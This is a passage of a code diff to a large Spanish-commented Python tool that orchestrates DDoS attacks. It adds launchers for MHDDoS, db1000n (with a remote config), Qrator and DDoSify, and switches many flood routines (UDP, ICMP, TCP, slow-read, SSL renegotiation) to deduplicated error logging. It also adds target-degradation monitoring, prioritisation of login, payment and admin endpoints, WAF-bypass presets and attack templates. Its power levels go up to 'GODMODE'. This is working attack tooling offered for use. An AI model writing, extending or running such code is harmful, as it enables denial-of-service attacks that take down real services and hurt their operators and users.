+    """Despliega ataque MHDDoS (herramienta moderna de DDoS)"""
+    if not check_command_exists("mhddos") and not check_command_exists("python3"):
+        log_message("WARN", "mhddos no disponible, omitiendo...")
+        return None
+    
+    threads = min(MULTIPLIER * 20, 1000)
+    
+    # MHDDoS puede ejecutarse como módulo Python o script
+    if check_command_exists("python3"):
+        cmd = ["python3", "-m", "mhddos", TARGET, "-t", str(threads), "-p", str(PORT)]
+    elif check_command_exists("mhddos"):
+        cmd = ["mhddos", TARGET, "-t", str(threads), "-p", str(PORT)]
+    else:
+        log_message("WARN", "mhddos no disponible, omitiendo...")
+        return None
+    
+    log_message("INFO", f"Desplegando mhddos: threads={threads}")
+    
+    if DRY_RUN:
+        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
+        return None
+    
+    try:
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        running_processes.append(process)
+        return process
+    except Exception as e:
+        log_message("ERROR", f"Error desplegando mhddos: {e}")
+        return None
+
+def deploy_db1000n():
+    """Despliega ataque db1000n (herramienta moderna de DDoS)"""
+    if not check_command_exists("db1000n"):
+        log_message("WARN", "db1000n no disponible, omitiendo...")
+        return None
+    
+    # db1000n usa configuración por archivo o flags
+    cmd = ["db1000n", "-c", "https://raw.githubusercontent.com/Arriven/db1000n/main/config.json", "-t", TARGET]
+    
+    log_message("INFO", f"Desplegando db1000n")
+    
+    if DRY_RUN:
+        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
+        return None
+    
+    try:
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        running_processes.append(process)
+        return process
+    except Exception as e:
+        log_message("ERROR", f"Error desplegando db1000n: {e}")
+        return None
+
+def deploy_qrator():
+    """Despliega ataque Qrator (herramienta de stress testing)"""
+    if not check_command_exists("qrator") and not check_command_exists("python3"):
+        log_message("WARN", "qrator no disponible, omitiendo...")
+        return None
+    
+    threads = min(MULTIPLIER * 15, 500)
+    
+    # Qrator puede ser script Python o comando directo
+    if os.path.exists("/usr/local/bin/qrator"):
+        cmd = ["python3", "/usr/local/bin/qrator", "-t", TARGET, "-c", str(threads), "-d", str(DURATION)]
+    elif check_command_exists("qrator"):
+        cmd = ["qrator", "-t", TARGET, "-c", str(threads), "-d", str(DURATION)]
+    elif check_command_exists("python3"):
+        # Intentar como módulo
+        cmd = ["python3", "-m", "qrator", "-t", TARGET, "-c", str(threads), "-d", str(DURATION)]
+    else:
+        log_message("WARN", "qrator no disponible, omitiendo...")
+        return None
+    
+    log_message("INFO", f"Desplegando qrator: threads={threads}")
+    
+    if DRY_RUN:
+        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
+        return None
+    
+    try:
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        running_processes.append(process)
+        return process
+    except Exception as e:
+        log_message("ERROR", f"Error desplegando qrator: {e}")
+        return None
+
+def deploy_ddosify():
+    """Desplega ataque DDoSify (herramienta moderna de load testing)"""
+    if not check_command_exists("ddosify"):
+        log_message("WARN", "ddosify no disponible, omitiendo...")
+        return None
+    
+    # DDoSify usa flags para configuración
+    total_requests = MULTIPLIER * 1000 * DURATION
+    duration_sec = DURATION
+    
+    cmd = [
+        "ddosify",
+        "-t", TARGET,
+        "-n", str(total_requests),
+        "-d", str(duration_sec),
+        "-T", "http",
+        "-m", "GET"
+    ]
+    
+    log_message("INFO", f"Desplegando ddosify: requests={total_requests}, duration={duration_sec}s")
+    
+    if DRY_RUN:
+        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
+        return None
+    
+    try:
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        running_processes.append(process)
+        return process
+    except Exception as e:
+        log_message("ERROR", f"Error desplegando ddosify: {e}")
+        return None
+
 def deploy_torshammer():
     """Despliega ataque Torshammer (Tor-based stress)"""
     if not check_command_exists("torshammer"):
@@ -5216,7 +6105,7 @@ def deploy_rudy():
                         pass
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e))
+                    add_error_deduplicated(str(e), max_length=200)
                     if DEBUG_MODE:
                         log_message("DEBUG", f"Error en RUDY worker {worker_id}: {e}")
                     time.sleep(1)
@@ -5374,8 +6263,7 @@ def deploy_tcp_flood_advanced():
                             sock.close()
                         except:
                             pass
-                        if len(attack_stats["errors"]) < 10:  # Limitar errores en stats
-                            attack_stats["errors"].append(f"TCP: {str(e)[:30]}")
+                        add_error_deduplicated(f"TCP: {str(e)[:30]}", max_length=50)
                     
                     # Limpiar conexiones cerradas o inválidas
                     valid_connections = []
@@ -5490,7 +6378,7 @@ def deploy_connection_exhaustion():
                     time.sleep(0.05)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.1)
             
             # Cerrar todas las conexiones
@@ -5554,7 +6442,7 @@ def deploy_slow_read_attack():
                     response.close()
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.5)
                     
         except Exception as e:
@@ -5633,7 +6521,7 @@ def deploy_http_pipelining_flood():
                     time.sleep(0.1)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.2)
                     
         except Exception as e:
@@ -5702,7 +6590,7 @@ def deploy_ssl_renegotiation_attack():
                     time.sleep(0.05)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.1)
                     
         except Exception as e:
@@ -5773,7 +6661,7 @@ def deploy_fragmented_request_attack():
                     sock.close()
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.2)
                     
         except Exception as e:
@@ -5830,7 +6718,7 @@ def deploy_http2_multiplexing_flood():
                     time.sleep(0.1)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.2)
                     
         except Exception as e:
@@ -5891,8 +6779,7 @@ def deploy_udp_flood():
                         time.sleep(0.01)
                         
                 except Exception as e:
-                    if len(attack_stats["errors"]) < 10:
-                        attack_stats["errors"].append(f"UDP: {str(e)[:30]}")
+                    add_error_deduplicated(f"UDP: {str(e)[:30]}", max_length=50)
                     time.sleep(0.01)
             
             # Cerrar socket al finalizar
@@ -5950,7 +6837,7 @@ def deploy_icmp_flood():
                     time.sleep(0.01 if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"] else 0.1)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.1)
                     
         except Exception as e:
@@ -6008,7 +6895,7 @@ def deploy_http_headers_bomb():
                     time.sleep(0.1)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.2)
                     
         except Exception as e:
@@ -6061,7 +6948,7 @@ def deploy_cookie_bomb():
                     time.sleep(0.1)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.2)
                     
         except Exception as e:
@@ -6120,7 +7007,7 @@ def deploy_method_override_attack():
                     time.sleep(0.1)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.1)
                     
         except Exception as e:
@@ -6180,7 +7067,7 @@ def deploy_zero_byte_attack():
                         time.sleep(0.01)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.05)
                     
         except Exception as e:
@@ -6240,7 +7127,7 @@ def deploy_random_subdomain_attack():
                     time.sleep(0.1)
                     
                 except Exception as e:
-                    attack_stats["errors"].append(str(e)[:50])
+                    add_error_deduplicated(str(e), max_length=50)
                     time.sleep(0.1)
                     
         except Exception as e:
@@ -6402,6 +7289,864 @@ def recover_failed_process():
         log_message("ERROR", f"Error en recuperación de procesos: {e}", context="recover_failed_process")
         return 0
 
+def perform_target_health_check() -> Dict:
+    """Realiza health check del target antes y durante el ataque"""
+    if not HEALTH_CHECK_ENABLED:
+        return {"status": "disabled"}
+    
+    try:
+        import requests
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        
+        start_time = time.time()
+        response = requests.get(
+            TARGET,
+            timeout=HEALTH_CHECK_TIMEOUT,
+            verify=False,
+            allow_redirects=False
+        )
+        elapsed = (time.time() - start_time) * 1000  # ms
+        
+        health_status = {
+            "status": "healthy",
+            "response_time_ms": elapsed,
+            "status_code": response.status_code,
+            "timestamp": datetime.now().isoformat(),
+            "accessible": True
+        }
+        
+        # Determinar estado de salud
+        if response.status_code >= 500:
+            health_status["status"] = "critical"
+        elif response.status_code >= 400:
+            health_status["status"] = "degraded"
+        elif elapsed > 5000:  # Más de 5 segundos
+            health_status["status"] = "degraded"
+        
+        return health_status
+    except requests.exceptions.Timeout:
+        return {
+            "status": "timeout",
+            "response_time_ms": HEALTH_CHECK_TIMEOUT * 1000,
+            "timestamp": datetime.now().isoformat(),
+            "accessible": False
+        }
+    except requests.exceptions.ConnectionError:
+        return {
+            "status": "unreachable",
+            "timestamp": datetime.now().isoformat(),
+            "accessible": False
+        }
+    except Exception as e:
+        return {
+            "status": "error",
+            "error": str(e)[:100],
+            "timestamp": datetime.now().isoformat(),
+            "accessible": False
+        }
+
+def analyze_realtime_response() -> Dict:
+    """Analiza respuesta del target en tiempo real y detecta degradación"""
+    if not REALTIME_ANALYSIS_ENABLED:
+        return {"status": "disabled"}
+    
+    try:
+        # Obtener métricas actuales
+        requests_sent = attack_stats.get("requests_sent", 0)
+        responses_received = attack_stats.get("responses_received", 0)
+        errors = len(attack_stats.get("errors", []))
+        latencies = attack_stats.get("latencies", [])
+        
+        if requests_sent == 0:
+            return {"status": "insufficient_data"}
+        
+        # Calcular tasa de error
+        error_rate = errors / requests_sent if requests_sent > 0 else 0
+        
+        # Calcular latencia promedio
+        avg_latency = sum(latencies[-100:]) / len(latencies[-100:]) if latencies else None
+        
+        # Obtener baseline si existe
+        baseline_latency = attack_stats.get("response_analysis", {}).get("baseline_latency")
+        
+        # Detectar degradación
+        degradation_detected = False
+        health_status = "healthy"
+        
+        if avg_latency and baseline_latency:
+            latency_multiplier = avg_latency / baseline_latency if baseline_latency > 0 else 1.0
+            if latency_multiplier >= DEGRADATION_THRESHOLD:
+                degradation_detected = True
+                health_status = "degraded"
+        
+        if error_rate >= ERROR_RATE_THRESHOLD:
+            degradation_detected = True
+            health_status = "critical"
+        
+        # Actualizar análisis en attack_stats
+        if "response_analysis" not in attack_stats:
+            attack_stats["response_analysis"] = {}
+        
+        attack_stats["response_analysis"].update({
+            "current_latency": avg_latency,
+            "degradation_detected": degradation_detected,
+            "error_rate": error_rate,
+            "health_status": health_status,
+            "last_analysis": datetime.now().isoformat()
+        })
+        
+        # Mantener historial de tasa de error
+        if "error_rate_trend" not in attack_stats["response_analysis"]:
+            attack_stats["response_analysis"]["error_rate_trend"] = []
+        attack_stats["response_analysis"]["error_rate_trend"].append({
+            "timestamp": datetime.now().isoformat(),
+            "error_rate": error_rate
+        })
+        # Mantener solo últimas 60 mediciones
+        if len(attack_stats["response_analysis"]["error_rate_trend"]) > 60:
+            attack_stats["response_analysis"]["error_rate_trend"].pop(0)
+        
+        return {
+            "status": "success",
+            "degradation_detected": degradation_detected,
+            "health_status": health_status,
+            "error_rate": error_rate,
+            "avg_latency": avg_latency,
+            "baseline_latency": baseline_latency
+        }
+    except Exception as e:
+        log_message("ERROR", f"Error en análisis de respuesta: {e}", context="analyze_realtime_response")
+        return {"status": "error", "error": str(e)[:100]}
+
+def adjust_adaptive_timeouts():
+    """Ajusta timeouts dinámicamente basado en respuesta del target"""
+    global CONNECT_TIMEOUT, READ_TIMEOUT
+    
+    if not ADAPTIVE_TIMEOUTS:
+        return
+    
+    try:
+        analysis = attack_stats.get("response_analysis", {})
+        health_status = analysis.get("health_status", "healthy")
+        avg_latency = analysis.get("current_latency")
+        
+        if not avg_latency:
+            return
+        
+        # Ajustar timeouts según estado de salud
+        if health_status == "critical":
+            # Target muy lento o caído - aumentar timeouts para evitar errores
+            CONNECT_TIMEOUT = min(CONNECT_TIMEOUT * 1.5, MAX_CONNECT_TIMEOUT)
+            READ_TIMEOUT = min(READ_TIMEOUT * 1.5, MAX_READ_TIMEOUT)
+            log_message("DEBUG", f"⏱️ [ADAPTIVE] Timeouts aumentados: connect={CONNECT_TIMEOUT:.1f}s, read={READ_TIMEOUT:.1f}s (target crítico)")
+        elif health_status == "degraded":
+            # Target degradado - aumentar ligeramente
+            CONNECT_TIMEOUT = min(CONNECT_TIMEOUT * 1.2, MAX_CONNECT_TIMEOUT)
+            READ_TIMEOUT = min(READ_TIMEOUT * 1.2, MAX_READ_TIMEOUT)
+        elif health_status == "healthy" and avg_latency < 100:
+            # Target responde rápido - reducir timeouts para más throughput
+            CONNECT_TIMEOUT = max(CONNECT_TIMEOUT * 0.9, MIN_CONNECT_TIMEOUT)
+            READ_TIMEOUT = max(READ_TIMEOUT * 0.9, MIN_READ_TIMEOUT)
+    except Exception as e:
+        log_message("ERROR", f"Error ajustando timeouts: {e}", context="adjust_adaptive_timeouts")
+
+def prioritize_endpoints(fingerprint: Dict = None) -> List[str]:
+    """Identifica y prioriza endpoints críticos basado en fingerprint"""
+    prioritized = []
+    
+    try:
+        # Endpoints descubiertos durante fingerprint
+        discovered_endpoints = fingerprint.get("discovered_endpoints", []) if fingerprint else []
+        
+        # Patrones de endpoints críticos
+        critical_patterns = [
+            "/login", "/auth", "/api/login", "/api/auth",
+            "/checkout", "/payment", "/api/payment",
+            "/admin", "/dashboard", "/api/admin",
+            "/api/", "/v1/", "/v2/", "/graphql"
+        ]
+        
+        # Priorizar endpoints que coinciden con patrones críticos
+        for endpoint in discovered_endpoints:
+            url = endpoint.get("url", "")
+            for pattern in critical_patterns:
+                if pattern in url.lower():
+                    prioritized.append(url)
+                    break
+        
+        # Si no hay endpoints descubiertos, usar el target principal
+        if not prioritized:
+            prioritized = [TARGET]
+        
+        # Guardar en attack_stats
+        attack_stats["prioritized_endpoints"] = prioritized
+        
+        return prioritized
+    except Exception as e:
+        log_message("ERROR", f"Error priorizando endpoints: {e}", context="prioritize_endpoints")
+        return [TARGET]
+
+def update_tool_metrics(tool_name: str, requests: int = 0, responses: int = 0, errors: int = 0, latency: float = None):
+    """Actualiza métricas por herramienta"""
+    try:
+        if "tool_metrics" not in attack_stats:
+            attack_stats["tool_metrics"] = {}
+        
+        if tool_name not in attack_stats["tool_metrics"]:
+            attack_stats["tool_metrics"][tool_name] = {
+                "requests": 0,
+                "responses": 0,
+                "errors": 0,
+                "latencies": [],
+                "avg_latency": 0,
+                "rps": 0,
+                "success_rate": 0
+            }
+        
+        metrics = attack_stats["tool_metrics"][tool_name]
+        metrics["requests"] += requests
+        metrics["responses"] += responses
+        metrics["errors"] += errors
+        
+        if latency is not None:
+            metrics["latencies"].append(latency)
+            # Mantener solo últimas 100 latencias
+            if len(metrics["latencies"]) > 100:
+                metrics["latencies"].pop(0)
+            metrics["avg_latency"] = sum(metrics["latencies"]) / len(metrics["latencies"]) if metrics["latencies"] else 0
+        
+        # Calcular success rate
+        if metrics["requests"] > 0:
+            metrics["success_rate"] = (metrics["responses"] / metrics["requests"]) * 100
+        
+        # Calcular RPS (aproximado)
+        if attack_stats.get("start_time"):
+            elapsed = (datetime.now() - attack_stats["start_time"]).total_seconds()
+            if elapsed > 0:
+                metrics["rps"] = metrics["requests"] / elapsed
+    except Exception as e:
+        log_message("ERROR", f"Error actualizando métricas de herramienta: {e}", context="update_tool_metrics")
+
+def add_error_deduplicated(error_message: str, max_length: int = 100):
+    """
+    Agrega un error con deduplicación y throttling para evitar saturación de logs.
+    Solo loggea errores únicos o errores repetidos después de un intervalo.
+    """
+    if not ERROR_DEDUPLICATION_ENABLED:
+        # Modo simple: solo agregar a la lista (comportamiento original)
+        if len(attack_stats["errors"]) < MAX_ERROR_COUNT:
+            attack_stats["errors"].append(error_message[:max_length])
+        return
+    
+    try:
+        # Normalizar mensaje de error (remover información variable como IPs, timestamps)
+        normalized_error = error_message[:max_length]
+        
+        # Normalizar patrones comunes de errores
+        import re
+        # Remover IPs
+        normalized_error = re.sub(r'\d+\.\d+\.\d+\.\d+', '<IP>', normalized_error)
+        # Remover timestamps
+        normalized_error = re.sub(r'\d{4}-\d{2}-\d{2}[\sT]\d{2}:\d{2}:\d{2}', '<TIMESTAMP>', normalized_error)
+        # Remover números de puerto variables
+        normalized_error = re.sub(r':\d{4,5}', ':PORT', normalized_error)
+        
+        current_time = time.time()
+        
+        # Incrementar contador de este error
+        attack_stats["error_counts"][normalized_error] += 1
+        count = attack_stats["error_counts"][normalized_error]
+        
+        # Agregar a lista de errores únicos si es nuevo
+        if normalized_error not in [e.get("message") for e in attack_stats.get("unique_errors", [])]:
+            if len(attack_stats.get("unique_errors", [])) < MAX_UNIQUE_ERRORS:
+                attack_stats.setdefault("unique_errors", []).append({
+                    "message": normalized_error,
+                    "count": count,
+                    "first_seen": current_time,
+                    "last_seen": current_time
+                })
+            else:
+                # Si alcanzamos el máximo, remover el más antiguo
+                if attack_stats.get("unique_errors"):
+                    attack_stats["unique_errors"].pop(0)
+                    attack_stats["unique_errors"].append({
+                        "message": normalized_error,
+                        "count": count,
+                        "first_seen": current_time,
+                        "last_seen": current_time
+                    })
+        else:
+            # Actualizar último visto y contador
+            for unique_error in attack_stats.get("unique_errors", []):
+                if unique_error.get("message") == normalized_error:
+                    unique_error["count"] = count
+                    unique_error["last_seen"] = current_time
+                    break
+        
+        # Throttling: solo loggear si ha pasado suficiente tiempo desde el último log
+        last_log_time = attack_stats.get("last_error_log_time", {}).get(normalized_error, 0)
+        should_log = (current_time - last_log_time) >= ERROR_LOG_THROTTLE_SECONDS
+        
+        # Loggear solo si:
+        # 1. Es la primera vez que vemos este error (count == 1)
+        # 2. O si ha pasado suficiente tiempo desde el último log (throttling)
+        # 3. O si el contador alcanza múltiplos de 10, 50, 100, etc.
+        if count == 1 or should_log or count % 10 == 0:
+            if count == 1:
+                log_message("ERROR", f"🔴 {normalized_error}", force_console=True)
+            elif count % 100 == 0:
+                log_message("ERROR", f"🔴 {normalized_error} (ocurrió {count} veces)", force_console=True)
+            elif count % 50 == 0:
+                log_message("WARN", f"⚠️ {normalized_error} (ocurrió {count} veces)")
+            elif count % 10 == 0:
+                log_message("DEBUG", f"{normalized_error} (ocurrió {count} veces)")
+            
+            attack_stats.setdefault("last_error_log_time", {})[normalized_error] = current_time
+        
+        # Mantener lista de errores originales limitada (para compatibilidad)
+        if len(attack_stats["errors"]) < MAX_ERROR_COUNT:
+            attack_stats["errors"].append(error_message[:max_length])
+        elif len(attack_stats["errors"]) >= MAX_ERROR_COUNT:
+            # Rotar: remover el más antiguo
+            attack_stats["errors"].pop(0)
+            attack_stats["errors"].append(error_message[:max_length])
+    
+    except Exception as e:
+        # Fallback: agregar error sin deduplicación si falla
+        if len(attack_stats["errors"]) < MAX_ERROR_COUNT:
+            attack_stats["errors"].append(error_message[:max_length])
+
+def apply_attack_preset(preset_name: str):
+    """Aplica un preset de ataque preconfigurado"""
+    global POWER_LEVEL, MULTIPLIER, MAX_CONNECTIONS, MAX_THREADS, STEALTH_MODE, WAF_BYPASS, RATE_ADAPTIVE
+    
+    if preset_name not in ATTACK_PRESETS:
+        log_message("WARN", f"Preset '{preset_name}' no encontrado. Presets disponibles: {', '.join(ATTACK_PRESETS.keys())}")
+        return False
+    
+    preset = ATTACK_PRESETS[preset_name]
+    
+    POWER_LEVEL = preset["power_level"]
+    MULTIPLIER = POWER_LEVELS[POWER_LEVEL]
+    MAX_CONNECTIONS = preset["connections"]
+    MAX_THREADS = preset["threads"]
+    STEALTH_MODE = preset["stealth"]
+    WAF_BYPASS = preset["bypass_waf"]
+    RATE_ADAPTIVE = preset["rate_adaptive"]
+    
+    log_message("INFO", f"✅ Preset '{preset_name}' aplicado: {POWER_LEVEL}, {MAX_CONNECTIONS} conexiones, {MAX_THREADS} threads", force_console=True)
+    return True
+
+def detect_rate_limiting(response) -> bool:
+    """Detecta si el target está aplicando rate limiting basado en headers y códigos HTTP"""
+    if not response:
+        return False
+    
+    # Códigos HTTP que indican rate limiting
+    rate_limit_codes = [429, 503, 509]
+    if hasattr(response, 'status_code') and response.status_code in rate_limit_codes:
+        return True
+    
+    # Headers que indican rate limiting
+    if hasattr(response, 'headers'):
+        rate_limit_headers = [
+            'x-ratelimit-remaining',
+            'x-ratelimit-reset',
+            'retry-after',
+            'rate-limit',
+            'x-rate-limit-limit',
+            'x-rate-limit-remaining',
+            'x-rate-limit-reset'
+        ]
+        for header in rate_limit_headers:
+            if header.lower() in [h.lower() for h in response.headers.keys()]:
+                return True
+    
+    return False
+
+def auto_recover_failed_tool(tool_name: str, max_retries: int = 3) -> bool:
+    """Intenta recuperar automáticamente una herramienta que falló"""
+    try:
+        # Verificar si la herramienta está instalada
+        if not check_command_exists(tool_name):
+            log_message("WARN", f"Herramienta '{tool_name}' no está instalada - intentando instalar...")
+            # Intentar instalar
+            install_commands = get_install_commands()
+            if tool_name in install_commands:
+                commands = install_commands[tool_name]
+                for cmd in commands[:1]:  # Intentar solo el primer comando
+                    try:
+                        result = subprocess.run(
+                            cmd,
+                            shell=True,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            timeout=60
+                        )
+                        if result.returncode == 0:
+                            log_message("INFO", f"✅ Herramienta '{tool_name}' instalada exitosamente")
+                            return True
+                    except Exception as e:
+                        log_message("ERROR", f"Error instalando '{tool_name}': {e}")
+        
+        # Si ya está instalada, puede ser un problema temporal
+        log_message("INFO", f"Herramienta '{tool_name}' parece estar instalada - puede ser un problema temporal")
+        return True
+    
+    except Exception as e:
+        log_message("ERROR", f"Error en auto-recuperación de '{tool_name}': {e}")
+        return False
+
+# ============================================================================
+# PERFORMANCE PROFILING
+# ============================================================================
+
+_profiler = None
+_profile_stats = None
+
+def start_profiling():
+    """Inicia profiling de rendimiento"""
+    global _profiler
+    if PROFILING_ENABLED:
+        _profiler = cProfile.Profile()
+        _profiler.enable()
+        log_message("INFO", "📊 Profiling iniciado", force_console=True)
+
+def stop_profiling():
+    """Detiene profiling y genera reporte"""
+    global _profiler, _profile_stats
+    if _profiler:
+        _profiler.disable()
+        s = io.StringIO()
+        _profile_stats = pstats.Stats(_profiler, stream=s)
+        _profile_stats.sort_stats('cumulative')
+        _profile_stats.print_stats(50)  # Top 50 funciones
+        
+        # Guardar reporte
+        try:
+            PROFILE_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
+            profile_file = PROFILE_OUTPUT_DIR / f"profile_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            with open(profile_file, 'w', encoding='utf-8') as f:
+                f.write(s.getvalue())
+            log_message("INFO", f"📊 Reporte de profiling guardado en: {profile_file}", force_console=True)
+        except Exception as e:
+            log_message("ERROR", f"Error guardando reporte de profiling: {e}")
+        
+        return s.getvalue()
+    return None
+
+def profile_function(func):
+    """Decorador para profiling de funciones específicas"""
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        if PROFILING_ENABLED:
+            profiler = cProfile.Profile()
+            profiler.enable()
+            try:
+                result = func(*args, **kwargs)
+            finally:
+                profiler.disable()
+                s = io.StringIO()
+                stats = pstats.Stats(profiler, stream=s)
+                stats.sort_stats('cumulative')
+                stats.print_stats(20)
+                log_message("DEBUG", f"Profile de {func.__name__}:\n{s.getvalue()[:500]}")
+            return result
+        else:
+            return func(*args, **kwargs)
+    return wrapper
+
+# ============================================================================
+# EXPORTACIÓN DE MÉTRICAS
+# ============================================================================
+
+def export_metrics_prometheus(metrics: Dict) -> str:
+    """Exporta métricas en formato Prometheus"""
+    lines = []
+    lines.append("# HELP loadtest_requests_total Total number of requests sent")
+    lines.append("# TYPE loadtest_requests_total counter")
+    lines.append(f"loadtest_requests_total {metrics.get('requests_sent', 0)}")
+    
+    lines.append("# HELP loadtest_responses_total Total number of responses received")
+    lines.append("# TYPE loadtest_responses_total counter")
+    lines.append(f"loadtest_responses_total {metrics.get('responses_received', 0)}")
+    
+    lines.append("# HELP loadtest_errors_total Total number of errors")
+    lines.append("# TYPE loadtest_errors_total counter")
+    lines.append(f"loadtest_errors_total {metrics.get('errors_count', 0)}")
+    
+    lines.append("# HELP loadtest_rps_current Current requests per second")
+    lines.append("# TYPE loadtest_rps_current gauge")
+    lines.append(f"loadtest_rps_current {metrics.get('current_rps', 0)}")
+    
+    lines.append("# HELP loadtest_latency_ms Average latency in milliseconds")
+    lines.append("# TYPE loadtest_latency_ms gauge")
+    lines.append(f"loadtest_latency_ms {metrics.get('avg_latency_ms', 0)}")
+    
+    # HTTP codes
+    for code, count in metrics.get('http_codes', {}).items():
+        lines.append(f"loadtest_http_code{{code=\"{code}\"}} {count}")
+    
+    return "\n".join(lines)
+
+def export_metrics_influxdb(metrics: Dict) -> str:
+    """Exporta métricas en formato InfluxDB Line Protocol"""
+    lines = []
+    timestamp = int(time.time() * 1e9)  # Nanosegundos
+    
+    lines.append(f"loadtest,host={socket.gethostname()} requests_sent={metrics.get('requests_sent', 0)} {timestamp}")
+    lines.append(f"loadtest,host={socket.gethostname()} responses_received={metrics.get('responses_received', 0)} {timestamp}")
+    lines.append(f"loadtest,host={socket.gethostname()} errors_count={metrics.get('errors_count', 0)} {timestamp}")
+    lines.append(f"loadtest,host={socket.gethostname()} rps={metrics.get('current_rps', 0)} {timestamp}")
+    lines.append(f"loadtest,host={socket.gethostname()} latency_ms={metrics.get('avg_latency_ms', 0)} {timestamp}")
+    
+    return "\n".join(lines)
+
+def export_metrics(metrics: Dict = None):
+    """Exporta métricas según el formato configurado"""
+    if not METRICS_EXPORT_ENABLED:
+        return
+    
+    try:
+        if metrics is None:
+            # Obtener métricas actuales
+            metrics = {
+                "requests_sent": attack_stats.get("requests_sent", 0),
+                "responses_received": attack_stats.get("responses_received", 0),
+                "errors_count": len(attack_stats.get("errors", [])),
+                "current_rps": attack_stats.get("avg_rps", 0),
+                "avg_latency_ms": sum(attack_stats.get("latencies", [])[-100:]) / len(attack_stats.get("latencies", [])[-100:]) if attack_stats.get("latencies") else 0,
+                "http_codes": attack_stats.get("http_codes", {})
+            }
+        
+        METRICS_EXPORT_PATH.mkdir(parents=True, exist_ok=True)
+        
+        if METRICS_EXPORT_FORMAT == "prometheus":
+            content = export_metrics_prometheus(metrics)
+            filename = METRICS_EXPORT_PATH / f"metrics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.prom"
+        elif METRICS_EXPORT_FORMAT == "influxdb":
+            content = export_metrics_influxdb(metrics)
+            filename = METRICS_EXPORT_PATH / f"metrics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.influx"
+        else:  # json
+            content = json.dumps(metrics, indent=2)
+            filename = METRICS_EXPORT_PATH / f"metrics_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(content)
+        
+        log_message("DEBUG", f"Métricas exportadas a {filename}")
+    except Exception as e:
+        log_message("ERROR", f"Error exportando métricas: {e}")
+
+# ============================================================================
+# TEMPLATES DE ATAQUE
+# ============================================================================
+
+def save_attack_template(name: str, config: Dict) -> bool:
+    """Guarda una configuración de ataque como template"""
+    try:
+        TEMPLATES_DIR.mkdir(parents=True, exist_ok=True)
+        template_file = TEMPLATES_DIR / f"{name}.json"
+        
+        template_data = {
+            "name": name,
+            "created_at": datetime.now().isoformat(),
+            "config": config
+        }
+        
+        with open(template_file, 'w', encoding='utf-8') as f:
+            json.dump(template_data, f, indent=2)
+        
+        log_message("INFO", f"✅ Template '{name}' guardado exitosamente", force_console=True)
+        return True
+    except Exception as e:
+        log_message("ERROR", f"Error guardando template '{name}': {e}")
+        return False
+
+def load_attack_template(name: str) -> Optional[Dict]:
+    """Carga un template de ataque"""
+    try:
+        template_file = TEMPLATES_DIR / f"{name}.json"
+        if not template_file.exists():
+            log_message("WARN", f"Template '{name}' no encontrado")
+            return None
+        
+        with open(template_file, 'r', encoding='utf-8') as f:
+            template_data = json.load(f)
+        
+        log_message("INFO", f"✅ Template '{name}' cargado exitosamente", force_console=True)
+        return template_data.get("config")
+    except Exception as e:
+        log_message("ERROR", f"Error cargando template '{name}': {e}")
+        return None
+
+def list_attack_templates() -> List[str]:
+    """Lista todos los templates disponibles"""
+    try:
+        TEMPLATES_DIR.mkdir(parents=True, exist_ok=True)
+        templates = []
+        for template_file in TEMPLATES_DIR.glob("*.json"):
+            try:
+                with open(template_file, 'r', encoding='utf-8') as f:
+                    template_data = json.load(f)
+                    templates.append(template_data.get("name", template_file.stem))
+            except Exception:
+                templates.append(template_file.stem)
+        return sorted(templates)
+    except Exception as e:
+        log_message("ERROR", f"Error listando templates: {e}")
+        return []
+
+def apply_attack_template(name: str) -> bool:
+    """Aplica un template de ataque a la configuración actual"""
+    config = load_attack_template(name)
+    if not config:
+        return False
+    
